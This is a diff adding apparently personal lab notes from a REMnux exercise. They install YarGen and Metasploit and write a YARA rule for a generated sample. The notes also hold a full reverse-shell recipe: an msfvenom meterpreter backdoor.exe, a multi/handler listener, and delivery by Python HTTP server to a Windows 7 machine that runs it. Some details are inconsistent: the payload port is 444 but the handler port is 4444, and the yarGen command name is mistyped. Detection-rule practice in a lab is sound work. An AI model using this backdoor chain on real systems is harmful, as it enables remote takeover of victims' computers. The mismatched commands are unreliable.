@@ -1,0 +1,52 @@
+Install YarGen in Remnux
+
+git clone https://github.com/Neo23x0/yarGen.git
+cd yarGen/
+python3 yarGen.py --update
+python3 yarGen.py --help
+
+
+Install Metasploit in Remnux
+
+wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+chmod +x metasploit-latest-linux-x64-installer.run
+./metasploit-latest-linux-x64-installer.run
+
+next...next ...finish
+
+
+Create backdoor with Metasploit
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.2.4 lport=444 -f exe -o evil/backdoor.exe
+
+create yara rule for backdoor in Yargen
+python3 yargen -m /home/remnux/execise/evil/ -o /home/remnux/yargen/backdoor.yar
+
+verify yara rule:
+yara /home/remnux/yargen/backdoor.yar /home/remnux/execise/evil/
+
+
+
+
+EXTRAAAAAAAAA for attacking:::::::
+
+start the metasploit handler(session receiver)
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.0.2.4
+set lport 4444
+exploit
+
+Note: it will start the listener
+
+Transfer backdoor.exe to windows7:
+
+on remnux:
+python3 -m http.server 80
+
+win7:
+go to IE and browse to http://10.0.2.4
+download backdoor.exe
+and execute it
+
+Note: you will get the reverse shell in Metasploit
